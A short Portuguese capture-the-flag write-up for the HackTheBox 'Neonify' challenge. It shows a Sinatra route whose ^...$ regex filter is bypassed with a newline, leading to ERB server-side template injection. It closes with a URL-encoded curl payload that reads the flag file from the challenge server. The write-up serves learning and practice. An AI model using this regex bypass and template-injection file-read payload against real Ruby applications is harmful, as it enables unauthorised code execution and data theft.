#ctf 

https://app.hackthebox.com/challenges/neonify

Existe um input que é imprimido na página ao enviar (POST).

Vendo o código da aplicação, só é permitido números (0-9) e letras (a-z). Outra informação importante é que está sendo usado uma template injection (ERB), para fazer testes de **SSTI** primeiro é necessário realizar um bypass desta regex. `/^[0-9a-z ]+$/i`.

```ruby
post '/' do
    if params[:neon] =~ /^[0-9a-z ]+$/i
      @neon = ERB.new(params[:neon]).result(binding)
    else
      @neon = "Malicious Input Detected"
    end
    erb :'index'
  end
```

Este [artigo](https://davidhamann.de/2022/05/14/bypassing-regular-expression-checks/) ajudou a entender como burlar a regex. Ela não lida com uma string com mais de uma linha, então quebrando a linha com `\n` e adicionando um [payload](https://github.com/swisskyrepo/PayloadsAllTheThings/tree/master/Server%20Side%20Template%20Injection#ruby) `<%= 7*7 %>` o nosso input ficou `teste\n<%= 7*7 %>`.

Entretando ao enviar esse input é retornado um erro:
	`Invalid query parameters: invalid %-encoding (teste\n&amp;lt;%= 7*7 %&amp;gt;\n)`
	
Usando url encode em toda string conseguimos o resultado da multiplicação. Para pegar a flag basta enviar este payload `teste\n<%= File.open('/app/flag.txt').read %>` codificado:

```sh
curl -s -X POST "http://94.237.56.248:58630/" -d "neon=teste%0A%3C%25%3D%20File.open%28%27%2Fapp%2Fflag.txt%27%29.read%  
20%25%3E"
```

GG